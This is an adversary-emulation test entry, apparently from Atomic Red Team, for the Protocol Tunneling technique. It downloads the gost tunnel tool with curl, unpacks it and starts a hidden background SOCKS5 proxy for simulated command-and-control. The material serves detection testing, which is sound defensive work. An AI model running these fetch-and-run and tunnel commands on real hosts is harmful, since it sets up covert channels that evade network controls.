- id: 3afc90c4-90b3-44af-8d14-52852abe7258
  name: Install and Run gost Tunnel Proxy
  description: 'Downloads and runs gost (Go Simple Tunnel), a multi-protocol proxy
    and tunnel

    tool used by adversaries to establish SOCKS5 proxies, protocol relays, and

    encrypted tunnels on compromised hosts to facilitate C2 communication and

    lateral movement while evading network controls.'
  tactic: command-and-control
  technique:
    attack_id: T1572
    name: Protocol Tunneling
  platforms:
    linux:
      sh:
        command: nohup gost/gost -L socks5://:1080 >/dev/null 2>&1 &
        cleanup: 'pkill gost; rm -rf #{gost_path}'
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - command-and-control
  - atomic-red-team
  - t1572
  author: Atomic Red Team
  additional_info:
    input_arguments:
      remote_url:
        description: URL to download the gost release archive
        type: url
        default: https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz
      gost_path:
        description: Path to store the gost binary
        type: path
        default: PathToAtomicsFolder/../ExternalPayloads/gost
      listen_port:
        description: Local port for the SOCKS5 proxy listener
        type: integer
        default: 1080
    dependencies:
    - description: 'gost binary must exist at #{gost_path}/gost

        '
      prereq_command: 'test -f #{gost_path}/gost

        '
      get_prereq_command: 'mkdir -p #{gost_path}

        curl -L "#{remote_url}" -o "#{gost_path}/gost.tar.gz"

        tar -xzf "#{gost_path}/gost.tar.gz" -C "#{gost_path}"

        rm -f "#{gost_path}/gost.tar.gz"

        chmod +x #{gost_path}/gost

        '
    technique_created: '2020-03-15T16:03:39.082Z'
    atomic_guid: 3afc90c4-90b3-44af-8d14-52852abe7258
    import_timestamp: '2026-09-05T06:41:19.654537Z'
